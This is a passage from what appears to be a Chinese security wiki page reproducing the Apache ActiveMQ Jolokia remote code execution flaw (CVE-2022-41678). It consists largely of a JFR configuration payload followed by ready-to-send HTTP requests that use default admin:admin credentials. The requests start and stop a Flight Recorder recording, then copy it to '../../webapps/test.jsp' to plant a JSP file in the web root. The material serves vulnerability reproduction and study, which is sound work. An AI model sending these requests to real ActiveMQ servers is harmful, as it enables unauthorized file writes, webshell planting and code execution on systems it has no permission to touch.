      &lt;setting name=\&quot;cutoff\&quot; control=\&quot;memory-leak-detection-cutoff\&quot;&gt;0 ns&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CompilerConfiguration\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CompilerStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;1000 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.Compilation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;compiler-compilation-threshold\&quot;&gt;100 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CompilerPhase\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;compiler-phase-threshold\&quot;&gt;10 s&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CompilationFailure\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled-failure\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CompilerInlining\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled-failure\&quot;&gt;false&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CodeSweeperConfiguration\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CodeSweeperStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SweepCodeCache\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;compiler-sweeper-threshold\&quot;&gt;100 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CodeCacheConfiguration\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CodeCacheStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CodeCacheFull\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.OSInformation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CPUInformation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ThreadContextSwitchRate\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;compiler-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;10 s&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CPULoad\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;1000 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ThreadCPULoad\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;10 s&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.CPUTimeStampCounter\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SystemProcess\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;endChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.NetworkUtilization\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;5 s&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.InitialEnvironmentVariable\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.PhysicalMemory\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ObjectAllocationInNewTLAB\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;memory-profiling-enabled-medium\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ObjectAllocationOutsideTLAB\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;memory-profiling-enabled-medium\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.NativeLibrary\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.FileForce\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;file-io-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.FileRead\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;file-io-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.FileWrite\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;file-io-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SocketRead\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;socket-io-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SocketWrite\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;socket-io-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JavaExceptionThrow\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;enable-exceptions\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JavaErrorThrow\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;enable-errors\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ExceptionStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;1000 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ActiveRecording\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ActiveSetting\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.DataLoss\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.DumpReason\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ZPageAllocation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ZThreadPhase\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ZStatisticsCounter\&quot;&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;10 ms&lt;/setting&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ZStatisticsSampler\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
   &lt;event name=\&quot;jdk.JavaNativeAllocation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JavaNativeReallocate\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JavaNativeFree\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;!--
         Contents of the control element is not read by the JVM, it&#39;s used
         by Java Mission Control to change settings that carry the control attribute.
    --&gt;
    &lt;control&gt;
      &lt;selection name=\&quot;gc-level\&quot; default=\&quot;detailed\&quot; label=\&quot;Garbage Collector\&quot;&gt;
        &lt;option label=\&quot;Off\&quot; name=\&quot;off\&quot;&gt;off&lt;/option&gt;
        &lt;option label=\&quot;Normal\&quot; name=\&quot;detailed\&quot;&gt;normal&lt;/option&gt;
        &lt;option label=\&quot;All\&quot; name=\&quot;all\&quot;&gt;all&lt;/option&gt;
      &lt;/selection&gt;
      &lt;condition name=\&quot;gc-enabled-normal\&quot; true=\&quot;true\&quot; false=\&quot;false\&quot;&gt;
        &lt;or&gt;
          &lt;test name=\&quot;gc-level\&quot; operator=\&quot;equal\&quot; value=\&quot;normal\&quot;/&gt;
          &lt;test name=\&quot;gc-level\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
        &lt;/or&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;gc-enabled-all\&quot; true=\&quot;true\&quot; false=\&quot;false\&quot;&gt;
        &lt;test name=\&quot;gc-level\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
      &lt;/condition&gt;
      &lt;selection name=\&quot;memory-profiling\&quot; default=\&quot;medium\&quot; label=\&quot;Memory Profiling\&quot;&gt;
        &lt;option label=\&quot;Off\&quot; name=\&quot;off\&quot;&gt;off&lt;/option&gt;
        &lt;option label=\&quot;Object Allocation and Promotion\&quot; name=\&quot;medium\&quot;&gt;medium&lt;/option&gt;
        &lt;option label=\&quot;All, including Heap Statistics (May cause long full GCs)\&quot; name=\&quot;all\&quot;&gt;all&lt;/option&gt;
      &lt;/selection&gt;
      &lt;condition name=\&quot;memory-profiling-enabled-medium\&quot; true=\&quot;true\&quot; false=\&quot;false\&quot;&gt;
        &lt;or&gt;
          &lt;test name=\&quot;memory-profiling\&quot; operator=\&quot;equal\&quot; value=\&quot;medium\&quot;/&gt;
          &lt;test name=\&quot;memory-profiling\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
        &lt;/or&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;memory-profiling-enabled-all\&quot; true=\&quot;true\&quot; false=\&quot;false\&quot;&gt;
        &lt;test name=\&quot;memory-profiling\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
      &lt;/condition&gt;
      &lt;selection name=\&quot;compiler-level\&quot; default=\&quot;detailed\&quot; label=\&quot;Compiler\&quot;&gt;
        &lt;option label=\&quot;Off\&quot; name=\&quot;off\&quot;&gt;off&lt;/option&gt;
        &lt;option label=\&quot;Normal\&quot; name=\&quot;normal\&quot;&gt;normal&lt;/option&gt;
        &lt;option label=\&quot;Detailed\&quot; name=\&quot;detailed\&quot;&gt;detailed&lt;/option&gt;
        &lt;option label=\&quot;All\&quot; name=\&quot;all\&quot;&gt;all&lt;/option&gt;
      &lt;/selection&gt;
      &lt;condition name=\&quot;compiler-enabled\&quot; true=\&quot;false\&quot; false=\&quot;true\&quot;&gt;
        &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;off\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;compiler-enabled-failure\&quot; true=\&quot;true\&quot; false=\&quot;false\&quot;&gt;
        &lt;or&gt;
          &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;detailed\&quot;/&gt;
          &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
        &lt;/or&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;compiler-sweeper-threshold\&quot; true=\&quot;0 ms\&quot; false=\&quot;100 ms\&quot;&gt;
        &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;compiler-compilation-threshold\&quot; true=\&quot;1000 ms\&quot;&gt;
        &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;normal\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;compiler-compilation-threshold\&quot; true=\&quot;100 ms\&quot;&gt;
        &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;detailed\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;compiler-compilation-threshold\&quot; true=\&quot;0 ms\&quot;&gt;
        &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;compiler-phase-threshold\&quot; true=\&quot;60 s\&quot;&gt;
        &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;normal\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;compiler-phase-threshold\&quot; true=\&quot;10 s\&quot;&gt;
        &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;detailed\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;compiler-phase-threshold\&quot; true=\&quot;0 s\&quot;&gt;
        &lt;test name=\&quot;compiler-level\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
      &lt;/condition&gt;
      &lt;selection name=\&quot;method-sampling-interval\&quot; default=\&quot;normal\&quot; label=\&quot;Method Sampling\&quot;&gt;
        &lt;option label=\&quot;Off\&quot; name=\&quot;off\&quot;&gt;off&lt;/option&gt;
        &lt;option label=\&quot;Normal\&quot; name=\&quot;normal\&quot;&gt;normal&lt;/option&gt;
        &lt;option label=\&quot;High\&quot; name=\&quot;high\&quot;&gt;high&lt;/option&gt;
        &lt;option label=\&quot;Ludicrous (High Overhead)\&quot; name=\&quot;ludicrous\&quot;&gt;ludicrous&lt;/option&gt;
      &lt;/selection&gt;
      &lt;condition name=\&quot;method-sampling-java-interval\&quot; true=\&quot;999 d\&quot;&gt;
        &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;off\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;method-sampling-java-interval\&quot; true=\&quot;20 ms\&quot;&gt;
        &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;normal\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;method-sampling-java-interval\&quot; true=\&quot;10 ms\&quot;&gt;
        &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;high\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;method-sampling-java-interval\&quot; true=\&quot;1 ms\&quot;&gt;
        &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;ludicrous\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;method-sampling-native-interval\&quot; true=\&quot;999 d\&quot;&gt;
        &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;off\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;method-sampling-native-interval\&quot; true=\&quot;20 ms\&quot;&gt;
        &lt;or&gt;
          &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;normal\&quot;/&gt;
          &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;high\&quot;/&gt;
          &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;ludicrous\&quot;/&gt;
        &lt;/or&gt;
      &lt;/condition&gt;    
      &lt;condition name=\&quot;method-sampling-enabled\&quot; true=\&quot;false\&quot; false=\&quot;true\&quot;&gt;
        &lt;test name=\&quot;method-sampling-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;off\&quot;/&gt;
      &lt;/condition&gt;
      &lt;selection name=\&quot;thread-dump-interval\&quot; default=\&quot;everyMinute\&quot; label=\&quot;Thread Dump\&quot;&gt;
        &lt;option label=\&quot;Off\&quot; name=\&quot;off\&quot;&gt;999 d&lt;/option&gt;
        &lt;option label=\&quot;At least Once\&quot; name=\&quot;normal\&quot;&gt;everyChunk&lt;/option&gt;
        &lt;option label=\&quot;Every 60 s\&quot; name=\&quot;everyMinute\&quot;&gt;60 s&lt;/option&gt;
        &lt;option label=\&quot;Every 10 s\&quot; name=\&quot;everyTenSecond\&quot;&gt;10 s&lt;/option&gt;
        &lt;option label=\&quot;Every 1 s\&quot; name=\&quot;everySecond\&quot;&gt;1 s&lt;/option&gt;
      &lt;/selection&gt;
      &lt;condition name=\&quot;thread-dump-enabled\&quot; true=\&quot;false\&quot; false=\&quot;true\&quot;&gt;
        &lt;test name=\&quot;thread-dump-interval\&quot; operator=\&quot;equal\&quot; value=\&quot;999 d\&quot;/&gt;
      &lt;/condition&gt;
      &lt;selection name=\&quot;exception-level\&quot; default=\&quot;errors\&quot; label=\&quot;Exceptions\&quot;&gt;
        &lt;option label=\&quot;Off\&quot; name=\&quot;off\&quot;&gt;off&lt;/option&gt;
        &lt;option label=\&quot;Errors Only\&quot; name=\&quot;errors\&quot;&gt;errors&lt;/option&gt;
        &lt;option label=\&quot;All Exceptions, including Errors\&quot; name=\&quot;all\&quot;&gt;all&lt;/option&gt;
      &lt;/selection&gt;
      &lt;condition name=\&quot;enable-errors\&quot; true=\&quot;true\&quot; false=\&quot;false\&quot;&gt;
        &lt;or&gt;
          &lt;test name=\&quot;exception-level\&quot; operator=\&quot;equal\&quot; value=\&quot;errors\&quot;/&gt;
          &lt;test name=\&quot;exception-level\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
        &lt;/or&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;enable-exceptions\&quot; true=\&quot;true\&quot; false=\&quot;false\&quot;&gt;
        &lt;test name=\&quot;exception-level\&quot; operator=\&quot;equal\&quot; value=\&quot;all\&quot;/&gt;
      &lt;/condition&gt;
      &lt;selection name=\&quot;memory-leak-detection\&quot; default=\&quot;medium\&quot; label=\&quot;Memory Leak Detection\&quot;&gt;
        &lt;option label=\&quot;Off\&quot; name=\&quot;off\&quot;&gt;off&lt;/option&gt;
        &lt;option label=\&quot;Object Types\&quot; name=\&quot;minimal\&quot;&gt;minimal&lt;/option&gt;
        &lt;option label=\&quot;Object Types + Allocation Stack Traces\&quot; name=\&quot;medium\&quot;&gt;medium&lt;/option&gt;
        &lt;option label=\&quot;Object Types + Allocation Stack Traces + Path to GC Root\&quot; name=\&quot;full\&quot;&gt;full&lt;/option&gt;
      &lt;/selection&gt;
      &lt;condition name=\&quot;memory-leak-detection-enabled\&quot; true=\&quot;false\&quot; false=\&quot;true\&quot;&gt;
        &lt;test name=\&quot;memory-leak-detection\&quot; operator=\&quot;equal\&quot; value=\&quot;off\&quot;/&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;memory-leak-detection-stack-trace\&quot; true=\&quot;true\&quot; false=\&quot;false\&quot;&gt;
        &lt;or&gt;
          &lt;test name=\&quot;memory-leak-detection\&quot; operator=\&quot;equal\&quot; value=\&quot;medium\&quot;/&gt;
          &lt;test name=\&quot;memory-leak-detection\&quot; operator=\&quot;equal\&quot; value=\&quot;full\&quot;/&gt;
        &lt;/or&gt;
      &lt;/condition&gt;
      &lt;condition name=\&quot;memory-leak-detection-cutoff\&quot; true=\&quot;1 h\&quot; false=\&quot;0 ns\&quot;&gt;
        &lt;test name=\&quot;memory-leak-detection\&quot; operator=\&quot;equal\&quot; value=\&quot;full\&quot;/&gt;
      &lt;/condition&gt;
      &lt;text name=\&quot;synchronization-threshold\&quot; label=\&quot;Synchronization Threshold\&quot; contentType=\&quot;timespan\&quot; minimum=\&quot;0 s\&quot;&gt;10 ms&lt;/text&gt;
      &lt;text name=\&quot;file-io-threshold\&quot; label=\&quot;File I/O Threshold\&quot; contentType=\&quot;timespan\&quot; minimum=\&quot;0 s\&quot;&gt;10 ms&lt;/text&gt;
      &lt;text name=\&quot;socket-io-threshold\&quot; label=\&quot;Socket I/O Threshold\&quot; contentType=\&quot;timespan\&quot; minimum=\&quot;0 s\&quot;&gt;10 ms&lt;/text&gt;
      &lt;flag name=\&quot;class-loading-enabled\&quot; label=\&quot;Class Loading\&quot;&gt;false&lt;/flag&gt;
    &lt;/control&gt;
&lt;/configuration&gt;&quot;]
}
</code></pre></div>
<img alt="" src="./assets/20231130233450.png" /></p>
<h3 id="web">导出录制到web目录<a class="headerlink" href="#web" title="Permanent link">&para;</a></h3>
<p><div class="highlight"><pre><span></span><code>POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 141

{
    &quot;type&quot;: &quot;EXEC&quot;,
    &quot;mbean&quot;: &quot;jdk.management.jfr:type=FlightRecorder&quot;,
    &quot;operation&quot;: &quot;startRecording&quot;,
    &quot;arguments&quot;: [4]
}
</code></pre></div>
<img alt="" src="./assets/20231130233542.png" /></p>
<p><div class="highlight"><pre><span></span><code>POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 138

{
    &quot;type&quot;: &quot;EXEC&quot;,
    &quot;mbean&quot;: &quot;jdk.management.jfr:type=FlightRecorder&quot;,
    &quot;operation&quot;: &quot;stopRecording&quot;,
    &quot;arguments&quot;: [4]
}
</code></pre></div>
<img alt="" src="./assets/20231130233602.png" /></p>
<h4 id="web_1">导出到web目录<a class="headerlink" href="#web_1" title="Permanent link">&para;</a></h4>
<p><div class="highlight"><pre><span></span><code>POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 159

{
    &quot;type&quot;: &quot;EXEC&quot;,
    &quot;mbean&quot;: &quot;jdk.management.jfr:type=FlightRecorder&quot;,
    &quot;operation&quot;: &quot;copyTo&quot;,
    &quot;arguments&quot;: [4,&quot;../../webapps/test.jsp&quot;]
}
</code></pre></div>
<img alt="" src="./assets/20231130233747.png" /></p>
<h4 id="testjsp">test.jsp写入成功<a class="headerlink" href="#testjsp" title="Permanent link">&para;</a></h4>
<p><img alt="" src="./assets/20231130233759.png" /></p>
<p><img alt="" src="./assets/20231130233835.png" /></p>
<h2 id="_5">漏洞来源<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/</a></li>
</ul>
<h2 id="payload_1">payload<a class="headerlink" href="#payload_1" title="Permanent link">&para;</a></h2>
<p>本地搭建源码，环境配置不正确，无法调试代码，payload是搜索GitHub关键字找到的
- <a href="https://github.com/gradle/gradle-profiler/blob/2eb14e031fbd48203fb05b28183decd1ee2304de/src/main/resources/org/gradle/profiler/jfr/openjdk.jfc#L4">https://github.com/gradle/gradle-profiler/blob/2eb14e031fbd48203fb05b28183decd1ee2304de/src/main/resources/org/gradle/profiler/jfr/openjdk.jfc#L4</a></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache-ActiveMQ%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache-ActiveMQ%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apache ActiveMQ远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/" class="btn btn-xs btn-link">
        Apache ZooKeeper 未授权访问漏洞 CVE-2014-085
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>